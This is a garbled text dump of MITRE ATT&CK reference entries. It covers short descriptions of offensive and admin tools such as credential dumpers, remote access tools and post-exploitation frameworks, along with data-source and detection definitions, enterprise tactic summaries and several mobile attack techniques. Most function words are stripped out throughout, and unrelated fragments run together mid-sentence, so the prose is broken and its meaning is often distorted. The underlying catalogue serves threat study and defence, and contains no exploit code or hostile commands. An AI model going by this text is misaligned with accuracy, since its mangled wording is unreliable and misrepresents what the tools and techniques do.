anti-virus, recon, exfiltration. (Citation: GitHub PowerSploit 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation) [Windows Credential Editor](https://attack.mitre.org/software/S0005) password dumping tool. (Citation: Amplia WCE) [Impacket](https://attack.mitre.org/software/S0357) source collection modules written Python programmatically constructing manipulating network protocols. [Impacket](https://attack.mitre.org/software/S0357) tools remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, relay attacks.(Citation: Impacket Tools) [ipconfig](https://attack.mitre.org/software/S0100) Windows utility system's TCP/IP, DNS, DHCP, adapter configuration. (Citation: TechNet Ipconfig) [AADInternals](https://attack.mitre.org/software/S0677) PowerShell-based framework administering, enumerating, exploiting Azure Active Directory. tool publicly GitHub.(Citation: AADInternals Github)(Citation: AADInternals Documentation) [Tasklist](https://attack.mitre.org/software/S0057) utility displays list applications services Process IDs (PID) tasks running local remote computer. packaged Windows operating systems executed command-line interface. (Citation: Tasklist) [Lslsass](https://attack.mitre.org/software/S0121) publicly-available tool dump active logon session password hashes lsass process. (Citation: Mandiant APT1) [Arp](https://attack.mitre.org/software/S0099) displays modifies system's Address Resolution Protocol (ARP) cache. (Citation: TechNet Arp) [spwebmember](https://attack.mitre.org/software/S0227) SharePoint enumeration data dumping tool written .NET. (Citation: NCC APT15 Alive Strong) [Empire](https://attack.mitre.org/software/S0363) source, cross-platform remote administration post-exploitation framework publicly GitHub. tool written Python, post-exploitation agents written pure [PowerShell](https://attack.mitre.org/techniques/T1059/001) Windows Python Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) tools singled joint report public hacking tools adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire) [ifconfig](https://attack.mitre.org/software/S0101) Unix-based utility gather interact TCP/IP settings system. (Citation: Wikipedia Ifconfig) [dsquery](https://attack.mitre.org/software/S0105) command-line utility query Active Directory domain. (Citation: TechNet Dsquery) typically installed Windows Server versions installed non-server variants Microsoft-provided Remote Server Administration Tools bundle. [PcShare](https://attack.mitre.org/software/S1050) source remote access tool modified Chinese threat actors, notably FunnyDream campaign late 2018.(Citation: Bitdefender FunnyDream Campaign November 2020)(Citation: GitHub PcShare 2014) [RawDisk](https://attack.mitre.org/software/S0364) legitimate commercial driver EldoS Corporation interacting files, disks, partitions. driver direct modification data local computer's hard drive. cases, tool enact raw disk modifications user-mode processes, circumventing Windows operating security features.(Citation: EldoS RawDisk ITpro)(Citation: Novetta Blockbuster Destructive Malware) [netstat](https://attack.mitre.org/software/S0104) operating utility displays active TCP connections, listening ports, network statistics. (Citation: TechNet Netstat) [PoshC2](https://attack.mitre.org/software/S0378) source remote administration post-exploitation framework publicly GitHub. server-side components tool written Python, implants written [PowerShell](https://attack.mitre.org/techniques/T1059/001). [PoshC2](https://attack.mitre.org/software/S0378) focused Windows implantation, basic Python dropper Linux/macOS.(Citation: GitHub PoshC2) [Fgdump](https://attack.mitre.org/software/S0120) Windows password hash dumper. (Citation: Mandiant APT1) [xCmd](https://attack.mitre.org/software/S0123) source tool [PsExec](https://attack.mitre.org/software/S0029) user execute applications remote systems. (Citation: xCmd) [CSPY Downloader](https://attack.mitre.org/software/S0527) tool designed evade analysis download additional payloads [Kimsuky](https://attack.mitre.org/groups/G0094).(Citation: Cybereason Kimsuky November 2020) [Rclone](https://attack.mitre.org/software/S1040) command program syncing files cloud storage services Dropbox, Google Drive, Amazon S3, MEGA. [Rclone](https://attack.mitre.org/software/S1040) ransomware campaigns, including [Conti](https://attack.mitre.org/software/S0575) DarkSide Ransomware-as-a-Service operations.(Citation: Rclone)(Citation: Rclone Wars)(Citation: Detecting Rclone)(Citation: DarkSide Ransomware Gang)(Citation: DFIR Conti Bazar Nov 2021) [MimiPenguin](https://attack.mitre.org/software/S0179) credential dumper, [Mimikatz](https://attack.mitre.org/software/S0002), designed Linux platforms. (Citation: MimiPenguin GitHub 2017) [netsh](https://attack.mitre.org/software/S0108) scripting utility interact networking components local remote systems. (Citation: TechNet Netsh) [CARROTBALL](https://attack.mitre.org/software/S0465) FTP downloader utility 2019. [CARROTBALL](https://attack.mitre.org/software/S0465) downloader install [SYSCON](https://attack.mitre.org/software/S0464).(Citation: Unit 42 CARROTBAT January 2020) [BITSAdmin](https://attack.mitre.org/software/S0190) command tool create manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: BITSAdmin) [meek](https://attack.mitre.org/software/S0175) open-source Tor plugin tunnels Tor traffic HTTPS connections. [ROADTools](https://attack.mitre.org/software/S0684) framework enumerating Azure Active Directory environments. tool written Python publicly GitHub.(Citation: ROADtools Github) [Peirates](https://attack.mitre.org/software/S0683) post-exploitation Kubernetes exploitation framework focus gathering service account tokens lateral movement privilege escalation. tool written GoLang publicly GitHub.(Citation: Peirates GitHub) [Remcos](https://attack.mitre.org/software/S0332) closed-source tool marketed remote control surveillance software company called Breaking Security. [Remcos](https://attack.mitre.org/software/S0332) observed malware campaigns.(Citation: Riskiq Remcos Jan 2018)(Citation: Talos Remcos Aug 2018) [Systeminfo](https://attack.mitre.org/software/S0096) Windows utility gather detailed computer. (Citation: TechNet Systeminfo) [Out1](https://attack.mitre.org/software/S0594) remote access tool written python [MuddyWater](https://attack.mitre.org/groups/G0069) 2021.(Citation: Trend Micro Muddy Water March 2021) [ConnectWise](https://attack.mitre.org/software/S0591) legitimate remote administration tool 2016 threat actors including [MuddyWater](https://attack.mitre.org/groups/G0069) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) connect conduct lateral movement target environments.(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021) [Imminent Monitor](https://attack.mitre.org/software/S0434) commodity remote access tool (RAT) offered sale 2012 2019, operation conducted Imminent Monitor infrastructure. cracked versions variations RAT circulation.(Citation: Imminent Unit42 Dec2019) [Ruler](https://attack.mitre.org/software/S0358) tool abuse Exchange services. publicly GitHub tool executed command line. creators [Ruler](https://attack.mitre.org/software/S0358) released defensive tool, NotRuler, detect usage.(Citation: SensePost Ruler GitHub)(Citation: SensePost NotRuler) [Forfiles](https://attack.mitre.org/software/S0193) Windows utility commonly batch jobs execute commands selected files directories (ex: list directories drive, read files created yesterday, etc.). Forfiles executed command line, window, batch files/scripts. (Citation: Forfiles Aug 2016) [Winexe](https://attack.mitre.org/software/S0191) lightweight, source tool [PsExec](https://attack.mitre.org/software/S0029) designed administrators execute commands remote servers. (Citation: Winexe Github Sept 2013) [Winexe](https://attack.mitre.org/software/S0191) unique GNU/Linux based client. (Citation: Überwachung APT28 Forfiles June 2015) [MCMD](https://attack.mitre.org/software/S0500) remote access tool remote command capability [Dragonfly 2.0](https://attack.mitre.org/groups/G0074).(Citation: Secureworks MCMD July 2019) [Nltest](https://attack.mitre.org/software/S0359) Windows command-line utility list domain controllers enumerate domain trusts.(Citation: Nltest Manual) MailSniper penetration testing tool searching email Exchange environment specific terms (passwords, insider intel, network architecture information, etc.). non-administrative user search email, Exchange administrator search mailboxes user domain.(Citation: GitHub MailSniper) [sqlmap](https://attack.mitre.org/software/S0225) source penetration testing tool automate process detecting exploiting SQL injection flaws. (Citation: sqlmap Introduction) [pwdump](https://attack.mitre.org/software/S0006) credential dumper. (Citation: Wikipedia pwdump) Responder source tool LLMNR, NBT-NS MDNS poisoning, built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP Basic authentication. (Citation: GitHub Responder) [Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) toolkit adversary "pass" password hash (without knowing original password) log systems. (Citation: Mandiant APT1) [Donut](https://attack.mitre.org/software/S0695) source framework generate position-independent shellcode.(Citation: Donut Github)(Citation: Introducing Donut) [Donut](https://attack.mitre.org/software/S0695) generated code multiple threat actors inject load malicious payloads memory.(Citation: NCC WastedLocker June 2020) [Mimikatz](https://attack.mitre.org/software/S0002) credential dumper capable obtaining plaintext Windows account logins passwords, features testing security networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide) [gsecdump](https://attack.mitre.org/software/S0008) publicly-available credential dumper password hashes LSA secrets Windows operating systems. (Citation: TrueSec Gsecdump) [IronNetInjector](https://attack.mitre.org/software/S0581) [Turla](https://attack.mitre.org/groups/G0010) toolchain utilizes scripts open-source IronPython implementation Python .NET injector drop payloads including [ComRAT](https://attack.mitre.org/software/S0126).(Citation: Unit 42 IronNetInjector February 2021 ) [nbtstat](https://attack.mitre.org/software/S0102) utility troubleshoot NetBIOS resolution. (Citation: TechNet Nbtstat) [Invoke-PSImage](https://attack.mitre.org/software/S0231) takes PowerShell script embeds bytes script pixels PNG image. generates liner executing file web. usage embedding PowerShell code Invoke-Mimikatz module embed image file. calling image file macro example, macro download picture execute PowerShell code, dump passwords. (Citation: GitHub Invoke-PSImage) [NBTscan](https://attack.mitre.org/software/S0590) source tool conduct internal reconnaissance compromised network.(Citation: Debian nbtscan Nov 2019)(Citation: SecTools nbtscan June 2003)(Citation: Symantec Waterbug Jun 2019)(Citation: FireEye APT39 Jan 2019) [LaZagne](https://attack.mitre.org/software/S0349) post-exploitation, open-source tool recover stored passwords system. modules Windows, Linux, OSX, focused Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) publicly GitHub.(Citation: GitHub LaZagne Dec 2018) [Ping](https://attack.mitre.org/software/S0097) operating utility commonly troubleshoot verify network connections. (Citation: TechNet Ping) [cmd](https://attack.mitre.org/software/S0106) Windows command-line interpreter interact systems execute processes utilities. (Citation: TechNet Cmd)

Cmd.exe native functionality perform operations interact system, including listing files directory <code>dir</code> (Citation: TechNet Dir)), deleting files <code>del</code> (Citation: TechNet Del)), copying files <code>copy</code> (Citation: TechNet Copy)). [route](https://attack.mitre.org/software/S0103) change local IP routing table. (Citation: TechNet Route) [esentutl](https://attack.mitre.org/software/S0404) command-line tool database utilities Windows Extensible Storage Engine.(Citation: Esentutl) [CrackMapExec](https://attack.mitre.org/software/S0488), CME, post-exploitation tool developed Python designed penetration testing networks. [CrackMapExec](https://attack.mitre.org/software/S0488) collects Active Directory conduct lateral movement targeted networks.(Citation: CME Github September 2018) [Koadic](https://attack.mitre.org/software/S0250) Windows post-exploitation framework penetration testing tool publicly GitHub. [Koadic](https://attack.mitre.org/software/S0250) options staging payloads creating implants, performs operations Windows Script Host.(Citation: Github Koadic)(Citation: Palo Alto Sofacy 06-2018)(Citation: MalwareBytes LazyScripter Feb 2021) [schtasks](https://attack.mitre.org/software/S0111) schedule execution programs scripts Windows specific time. (Citation: TechNet Schtasks) [Cachedump](https://attack.mitre.org/software/S0119) publicly-available tool program extracts cached password hashes system’s registry. (Citation: Mandiant APT1) [Expand](https://attack.mitre.org/software/S0361) Windows utility expand compressed CAB files.(Citation: Expand Utility) [BBSRAT](https://attack.mitre.org/software/S0127) decompress CAB file executable content.(Citation: Palo Alto Networks BBSRAT) [Pupy](https://attack.mitre.org/software/S0192) source, cross-platform (Windows, Linux, OSX, Android) remote administration post-exploitation tool. (Citation: GitHub Pupy) written Python generated payload (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) publicly GitHub. (Citation: GitHub Pupy) [Reg](https://attack.mitre.org/software/S0075) Windows utility interact Windows Registry. command-line interface query, add, modify, remove information. (Citation: Reg)

Utilities [Reg](https://attack.mitre.org/software/S0075) persistent threats. (Citation: Windows Commands JPCERT) [ftp](https://attack.mitre.org/software/S0095) utility commonly operating systems transfer File Transfer Protocol (FTP). Adversaries transfer tools exfiltrate data.(Citation: FTP)(Citation: Linux FTP) [Mythic](https://attack.mitre.org/software/S0699) source, cross-platform post-exploitation/command control platform. [Mythic](https://attack.mitre.org/software/S0699) designed "plug-n-play" agents communication channels.(Citation: Mythic Github)(Citation: Mythic SpecterOps)(Citation: Mythc Documentation) Deployed [Mythic](https://attack.mitre.org/software/S0699) C2 servers observed malicious infrastructure.(Citation: RecordedFuture 2021 Infra) [HTRAN](https://attack.mitre.org/software/S0040) tool proxies connections intermediate hops aids users disguising true geographical location. adversaries hide location interacting victim networks. (Citation: Operation Quantum Entanglement)(Citation: NCSC Joint Report Public Tools) [SDelete](https://attack.mitre.org/software/S0195) application securely deletes data unrecoverable. Sysinternals suite tools. (Citation: SDelete July 2016) [QuasarRAT](https://attack.mitre.org/software/S0262) open-source, remote access tool publicly GitHub 2014. [QuasarRAT](https://attack.mitre.org/software/S0262) developed C# language.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) [Tor](https://attack.mitre.org/software/S0183) software suite network increased anonymity Internet. creates multi-hop proxy network utilizes multilayer encryption protect message routing information. [Tor](https://attack.mitre.org/software/S0183) utilizes "Onion Routing," messages encrypted multiple layers encryption; step proxy network, topmost layer decrypted contents forwarded node reaches destination. (Citation: Dingledine Tor Second-Generation Onion Router) [AdFind](https://attack.mitre.org/software/S0552) command-line query tool gathering Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk Trickbot January 2019) [Wevtutil](https://attack.mitre.org/software/S0645) Windows command-line utility enables administrators retrieve event logs publishers.(Citation: Wevtutil Documentation) [Havij](https://attack.mitre.org/software/S0224) automatic SQL Injection tool distributed Iranian ITSecTeam security company. Havij penetration testers adversaries. (Citation: Check Havij Analysis) [PsExec](https://attack.mitre.org/software/S0029) tool execute program computer. administrators attackers. (Citation: Russinovich Sysinternals) (Citation: SANS PsExec) user requested active directory credentials, ticket token (ex: Windows EID 4769) Initial construction WMI object, filter, consumer, subscription, binding, provider (ex: Sysmon EIDs 19-21) group, membership, name, permissions (ex: Windows EID 4728 4732, AWS IAM UpdateGroup) virtual machine image, including setting control data (ex: Azure Compute Service Images PATCH) extracted list pods cluster (ex: kubectl pods) Logged network traffic response scan protocol header body values Contextual data cloud volume activity it, id, type, state, size Contextual data Internet-facing resource gathered scan, running services ports Removal Registry Key (ex: Windows EID 4658 Sysmon EID 12) Deactivation stoppage instance (ex: instance.stop GCP Audit Logs) Code, strings, signatures compromise malicious payload Removal snapshot (ex: AWS delete-snapshot) Initial construction network connection, capturing socket source/destination IP port(s) (ex: Windows EID 5156, Sysmon EID 3, Zeek conn.log) process process, typically read memory target process (ex: Sysmon EID 10) Initial construction active directory object (ex: Windows EID 5137) Queried logged highlighting current expired digital certificates (ex: Certificate transparency) file, file contents requestor (ex: Windows EID 4663) object file code extend running kernel OS, typically add support hardware (as device drivers) filesystems, adding calls extracted list instances cloud environment (ex: instance.list GCP Audit Logs) Initial construction file (ex: Sysmon EID 11) Queried domain (DNS) registry data highlighting current domain IP address resolutions (ex: dig/nslookup queries) Attaching driver user kernel-mode (ex: Sysmon EID 6) Logged network traffic data protocol header body values (ex: PCAP) Contextual data logon session, username, logon type, access tokens (security context, user SIDs, logon identifiers, logon SID), activity Removal cloud volume (ex: AWS delete-volume) initial construction executable managed OS, involve tasks threads. (e.g. Win EID 4688, Sysmon EID 1, cmd.exe > use, etc.) Initial construction drive letter mount data storage device Initial construction snapshot (ex: AWS create-snapshot) cloud storage infrastructure, including settings data (ex: AWS S3 PutObject PutObjectAcl) instance, including settings control data (ex: instance.addResourcePolicies instances.setMetadata GCP Audit Logs) Contextual data instance activity name, type, status Removal cloud storage infrastructure (ex: AWS S3 DeleteBucket) drive letter mount data storage device Initial construction pod (ex: kubectl apply|run) Initial construction service/daemon (ex: Windows EID 4697 /var/log daemon logs) cloud storage infrastructure, typically collect/read (ex: AWS S3 GetObject) Initial construction cloud storage infrastructure (ex: AWS S3 CreateBucket) active directory object (ex: Windows EID 5163 5136) active directory object, typically collect/read (ex: Windows EID 4661) Initial construction credential material (ex: Windows EID 1200 4769) Activation invocation container (ex: docker start docker restart) Exit running process (ex: Sysmon EID 5 Windows EID 4689) Contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, etc. service/daemon, name, description, start type (ex: Windows EID 7040 /var/log daemon logs) pod, including settings control data (ex: kubectl set|patch|edit) execution text, arguments, created program code (e.g. cmdlet executed powershell.exe, interactive commands >dir, executions, etc. ) data storage device assigned drive letter mount Contextual data firewall activity name, policy, status Contextual data service/daemon, include name, service executable, start type, etc. Removal instance (ex: instance.delete GCP Audit Logs) Contextual data scheduled job, include name, timing, command(s), etc. Initial construction Registry Key (ex: Windows EID 4656 Sysmon EID 12) file, access permissions attributes, typically alter contents targeted file (ex: Windows EID 4670 Sysmon EID 2) Logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) Removal virtual machine image (ex: Azure Compute Service Images DELETE) Contextual data snapshot, include ID, type, status extracted list cloud services (ex: AWS ECS ListServices) Contextual data describes activity it, name, permissions, user accounts extracted list settings (ex: AWS list-groups) Established, compromised, acquired social media personas Removal active directory object (ex: Windows EID 5141) extracted list containers (ex: docker ps) Contextual data malicious payload, compilation times, file hashes, watermarks identifiable configuration Initial construction WMI object, filter, consumer, subscription, binding, provider (ex: Sysmon EIDs 19-21) Logging, messaging, artifacts third-party services (ex: metrics, errors, alerts mail/web applications) Initial construction successful user logon authentication attempt. (e.g. Windows EID 4624, /var/log/utmp, /var/log/wmtp) execution file code interpreter (e.g. Powershell, WMI, Windows EID 4104, etc.) Initial construction container (ex: docker create <container_name>) Summarized network packet data, metrics, protocol headers volume (ex: Netflow Zeek http.log) attempt user gain access network computing resource, providing credentials (ex: Windows EID 4776 /var/log/auth.log) Initial construction virtual machine image (ex: Azure Compute Service Images PUT) Contextual data cloud service activity name, type, purpose/function Contextual data virtual machine image name, resource group, state, type Initial construction instance (ex: instance.insert GCP Audit Logs) Contextual data account, include username, user ID, environmental data, etc. Contextual data named pipe system, including pipe creating process (ex: Sysmon EIDs 17-18) firmware, including settings data, MBR (Master Boot Record) VBR (Volume Boot Record) extracted list firewalls settings/rules (ex: Azure Network Firewall CLI commands) Attaching module memory process/program, typically access shared resources/features module (ex: Sysmon EID 7) Contextual data pod activity name, ID, namespace, status Deactivation stoppage cloud service (ex: Write/Delete entries Azure Firewall Activity Logs) Logged domain (DNS) data highlighting timelines domain IP address resolutions (ex: passive DNS) account, permissions membership specific (ex: Windows EID 4738 /var/log access/authentication logs) firewall rule, typically allow/block specific network traffic (ex: Windows EID 4950 Write/Delete entries Azure Firewall Rule Collection Activity Logs) cloud volume, including settings control data (ex: AWS modify-volume) process, contents, typically write execute code memory target process (ex: Sysmon EID 8) Removal account (ex: Windows EID 4726 /var/log access/authentication logs) Registry Key Key (ex: Windows EID 4657 Sysmon EID 13|14) Initial construction cloud volume (ex: AWS create-volume) Initial construction account (ex: Windows EID 4720 /etc/passwd logs) Contextual data container activity name, ID, image, status Contextual data cloud storage infrastructure activity name, size, owner cloud service, including settings data (ex: AWS CloudTrail DeleteTrail DeleteConfigRule) Removal file (ex: Sysmon EID 23, macOS ESF EID ES_EVENT_TYPE_AUTH_UNLINK, Linux commands auditd unlink, rename, rmdir, unlinked, renameat rules) Deactivation stoppage cloud service (ex: AWS Cloudtrail StopLogging) extracted list volumes cloud environment (ex: AWS describe-volumes) Registry Key, typically read (ex: Windows EID 4656) Contextual data running process, include environment variables, image name, user/owner, etc. snapshop, metadata control data (ex: AWS modify-snapshot-attribute) Initial construction scheduled job (ex: Windows EID 4698 /var/log cron logs) network share, contents requestor (ex: Windows EID 5140 5145) Contextual data driver activity driver issues reporting integrity (page hash, code) checking Activation invocation instance (ex: instance.start GCP Audit Logs) scheduled job, modifications execution launch (ex: Windows EID 4702 /var/log cron logs) Contextual data cluster activity name, namespace, age, status extracted list cloud storage infrastructure (ex: AWS S3 ListBuckets ListObjects) attempt user gain access network computing resource providing credentials (ex: Windows EID 1202) domain assignments domain metadata (ex: WHOIS) extracted list snapshops cloud environment (ex: AWS describe-snapshots) single unit shared resources cluster, comprised containers(Citation: Kube Kubectl)(Citation: Kube Pod) standard unit virtualized software packages code dependencies application runs reliably computing environment another(Citation: Docker Docs Container) profile representing user, device, service, application authenticate access resources Windows OS hierarchical database stores settings software programs, hardware devices, user preferences, operating-system configurations(Citation: Registry) file stream list commands, allowing launched sequence(Citation: PowerShell Logging)(Citation: FireEye PowerShell Logging)(Citation: AMSI) single file deploy virtual machine/bootable disk on-premise third-party cloud environment(Citation: Image)(Citation: Amazon AMI) Credential material, session cookies tokens, authenticate applications services(Citation: Medium Authentication Tokens)(Citation: Auth0 Access Tokens) Mechanisms inter-process communication locally network. named pipe file processes attach it(Citation: Named Pipes) digital document, highlights owner's identity, instill trust public encrypting network communications infrastructure management data operations enables local remote management Windows personal computers servers(Citation: WMI Classes)(Citation: WMI Architecture) Data object storage infrastructure hosted on-premise third-party providers, users network connections APIs(Citation: Amazon S3)(Citation: Azure Blob Storage)(Citation: Google Cloud Storage) (commonly active network traffic probes crawling) types resources servers connected public Internet malicious online profile representing user commonly adversaries social engineer target victims collection multiple user accounts share access rights network resources common security rights(Citation: Amazon IAM Groups) Events collected third-party services mail servers, applications, appliances (not native OS platform)(Citation: Confluence Logs) Logon occurring resource (local, domain, cloud) user/device gaining access successful authentication authorization(Citation: Audit Logon Events) virtual server environment runs workloads, hosted on-premise third-party cloud providers(Citation: Amazon VM)(Citation: Google VM) host telemetry providing insights status, errors, notable functional activity resource object, managed I/O system, storing data (such images, text, videos, programs, wide variety media).(Citation: File Mgmt) non-volatile data storage device (hard drive, floppy disk, USB flash drive) formatted partition, typically mounted file assigned drive letter(Citation: Sysmon EID 9) point-in-time cloud volumes (files, settings, etc.) created deployed cloud environments(Citation: Snapshot)(Citation: Amazon Snapshots) directive program, acting interpreter kind, perform specific task(Citation: Confluence Linux Command  Line)(Citation: Audit OSX) program, core OS, resides memory facilitates interactions hardware software components(Citation: STIG Audit Kernel Modules)(Citation: Init Page) program operates controls type device attached computer. software interface hardware devices, enabling operating systems programs access hardware functions precise details hardware used(Citation: IOKit Fundamentals)(Citation: Windows Started Drivers) Block object storage hosted on-premise third-party providers, typically resources virtualized hard drives(Citation: Amazon S3)(Citation: Azure Blob Storage)(Citation: Google Cloud Storage) Infrastructure, platforms, software hosted on-premise third-party providers, users network connections APIs(Citation: Amazon AWS)(Citation: Azure Products) (via shared submitted samples) malicious software (droppers, backdoors, etc.) adversaries storage resource (typically folder drive) host network protocols, Server Message Block (SMB) Network File (NFS)(Citation: NFS Overview) Data transmitted network (ex: Web, DNS, Mail, File, etc.), summarized (ex: Netflow) captured raw data analyzable format (ex: PCAP) set containerized computing resources managed separate nodes execute tasks applications(Citation: Kube Cluster Admin)(Citation: Kube Cluster Info) Automated tasks executed specific time recurring schedule running background (ex: Cron daemon, task scheduler, BITS)(Citation: Tasks) software low-level control hardware device(s) host, BIOS UEFI/EFI database set services administrators manage permissions, access network resources, stored data objects (user, group, application, devices)(Citation: DS Started) process configured execute continuously background perform tasks, user logged in(Citation: Services)(Citation: Linux Services Levels) (commonly registration activity logs) IP addresses registered human readable names (ex: mitre.org) Instances programs executed thread. Processes memory space process executables, loaded modules (DLLs shared libraries), allocated memory regions user input application-specific data structures(Citation: Processes Threads) network security system, running locally endpoint remotely service (ex: cloud environment), monitors controls incoming/outgoing network traffic based predefined rules(Citation: AWS VPC) Executable files consisting shared classes interfaces, portable executable (PE) format binaries/dynamic link libraries (DLL), executable linkable format (ELF) binaries/shared libraries, Mach-O format binaries/shared libraries(Citation: LoadLibrary)(Citation: Module Class) tactics technique representing MITRE ATT&CK Matrix Enterprise. Matrix platforms: Windows, macOS, Linux, AWS, GCP, Azure, Azure AD, Office 365, SaaS. adversary steal account names passwords.

Credential Access consists techniques stealing credentials account names passwords. Techniques credentials include keylogging credential dumping. legitimate credentials adversaries access systems, harder detect, provide opportunity create accounts achieve goals. adversary malicious code.

Execution consists techniques result adversary-controlled code running local remote system. Techniques malicious code paired techniques tactics achieve broader goals, exploring network stealing data. example, adversary remote access tool PowerShell script Remote Discovery.  adversary manipulate, interrupt, destroy systems data.
 
Impact consists techniques adversaries disrupt availability compromise integrity manipulating business operational processes. Techniques impact include destroying tampering data. cases, business processes fine, altered benefit adversaries’ goals. techniques adversaries follow goal provide cover confidentiality breach. adversary maintain foothold.

Persistence consists techniques adversaries access systems restarts, changed credentials, interruptions cut access. Techniques persistence include access, action, configuration maintain foothold systems, replacing hijacking legitimate code adding startup code.  adversary gain higher-level permissions.

Privilege Escalation consists techniques adversaries gain higher-level permissions network. Adversaries enter explore network unprivileged access require elevated permissions follow objectives. Common approaches advantage weaknesses, misconfigurations, vulnerabilities. Examples elevated access include: 

* SYSTEM/root level
* local administrator
* user account admin-like access 
* user accounts access specific perform specific function

These techniques overlap Persistence techniques, OS features adversary persist execute elevated context.   adversary environment.

Lateral Movement consists techniques adversaries enter control remote systems network. primary objective requires exploring network target subsequently gaining access it. Reaching objective involves pivoting multiple systems accounts gain. Adversaries install remote access tools accomplish Lateral Movement legitimate credentials native network operating tools, stealthier.  adversary avoid detected.

Defense Evasion consists techniques adversaries avoid detection compromise. Techniques defense evasion include uninstalling/disabling security software obfuscating/encrypting data scripts. Adversaries leverage abuse trusted processes hide masquerade malware. tactics’ techniques cross-listed techniques include benefit subverting defenses.  adversary steal data.

Exfiltration consists techniques adversaries steal data network. they’ve collected data, adversaries package avoid detection removing it. include compression encryption. Techniques data target network typically include transferring command control channel alternate channel include putting size limits transmission. adversary figure environment.

Discovery consists techniques adversary gain knowledge internal network. techniques adversaries observe environment orient deciding act. adversaries explore control what’s entry discover benefit current objective. Native operating tools post-compromise information-gathering objective.  adversary gather data goal.

Collection consists techniques adversaries gather sources collected relevant adversary's objectives. Frequently, goal collecting data steal (exfiltrate) data. Common target sources include drive types, browsers, audio, video, email. Common collection methods include capturing screenshots keyboard input. adversary establish resources support operations.

Resource Development consists techniques involve adversaries creating, purchasing, compromising/stealing resources support targeting. resources include infrastructure, accounts, capabilities. resources leveraged adversary aid phases adversary lifecycle, purchased domains support Command Control, email accounts phishing Initial Access, stealing code signing certificates Defense Evasion. adversary gather plan future operations.

Reconnaissance consists techniques involve adversaries actively passively gathering support targeting. include details victim organization, infrastructure, staff/personnel. leveraged adversary aid phases adversary lifecycle, gathered plan execute Initial Access, scope prioritize post-compromise objectives, drive lead Reconnaissance efforts. adversary communicate compromised systems control them.

Command Control consists techniques adversaries communicate systems control victim network. Adversaries commonly attempt mimic normal, expected traffic avoid detection. adversary establish command control levels stealth depending victim’s network structure defenses. adversary network.

Initial Access consists techniques entry vectors gain initial foothold network. Techniques gain foothold include targeted spearphishing exploiting weaknesses public-facing servers. Footholds gained initial access continued access, valid accounts external remote services, limited-use changing passwords. Adversaries abuse task scheduling functionality facilitate initial recurring execution malicious code. Android iOS, APIs libraries exist facilitate scheduling tasks execute date, time, interval.

On Android, `WorkManager` API asynchronous tasks scheduled system. `WorkManager` introduced unify task scheduling Android, `JobScheduler`, `GcmNetworkManager`, `AlarmManager` internally. `WorkManager` offers lot flexibility scheduling, including periodically, time, constraint-based (e.g. device charging).(Citation: Android WorkManager)

On iOS, `NSBackgroundActivityScheduler` API asynchronous tasks scheduled system. tasks scheduled repeating non-repeating, however, chooses tasks executed. app choose interval repeating tasks, delay scheduling execution one-time tasks.(Citation: Apple NSBackgroundActivityScheduler) Adversaries code injection attacks implant arbitrary code address space running application. Code executed interpreted application. Adversaries utilizing technique exploit capabilities load code runtime dynamic libraries.

With root access, `ptrace` target specific applications load shared libraries process memory.(Citation: Shunix Code Injection Mar 2016)(Citation: Fadeev Code Injection Aug 2018) injecting code, adversary gain access permissions held targeted application executing targeted application. addition, adversary evade detection enable persistent access guise application’s process.(Citation: Google Triada June 2019)
 Adversaries attempt position networked devices support follow-on behaviors [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002) [Endpoint Denial Service](https://attack.mitre.org/techniques/T1642).  

 

[Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1638) achieved mechanisms, malicious application registering VPN client. this, adversary effectively redirect device traffic want. However, registering VPN client requires user consent Android iOS. Additionally, iOS, application requires special entitlement granted Apple. Alternatively, application escalate privileges, utilize privileges gain access network traffic.  

 

Outside mobile device, adversaries capture traffic employing rogue base station Wi-Fi access point. devices adversaries capture network traffic left device, flowing destination. local network, enterprise techniques used, DNS redirection DNS poisoning.  

 

If applications properly encrypt network traffic, sensitive data accessible adversary, depending capture.  Adversaries circumvent mechanisms designed control elevated privileges gain higher-level permissions. modern systems native elevation control mechanisms intended limit privileges user gain machine. Authorization granted specific users perform tasks designated risk. adversary methods advantage built-in control mechanisms escalate privileges system.  adversary unauthorized access misuse authorized access cloud backup services (e.g. Google's Android backup service Apple's iCloud) access sensitive data stored device backups. example, Elcomsoft Phone Breaker product advertises ability retrieve iOS backup data Apple's iCloud (Citation: Elcomsoft-EPPB). Elcomsoft describes (Citation: Elcomsoft-WhatsApp) obtaining WhatsApp communication histories backups stored iCloud. Adversaries include functionality malware uninstalls malicious application device. achieved by: 
 
* Abusing device owner permissions perform silent uninstallation device owner API calls. 
* Abusing root permissions delete files filesystem. 
* Abusing accessibility service. requires sending intent request uninstallation, abusing accessibility service proper screen confirm uninstallation. Adversaries delete, alter, hide generated artifacts device, including files, jailbreak status, malicious application itself. actions interfere event collection, reporting, notifications detect intrusion activity. compromise integrity mobile security solutions causing notable events unreported. Adversaries manipulate products product delivery mechanisms prior receipt final consumer purpose data compromise.

Supply chain compromise stage supply chain including:

* Manipulation development tools
* Manipulation development environment
* Manipulation source code repositories (public private)
* Manipulation source code open-source dependencies
* Manipulation software update/distribution mechanisms
* Compromised/infected images
* Replacement legitimate software modified versions
* Sales modified/counterfeit products legitimate distributors
* Shipment interdiction

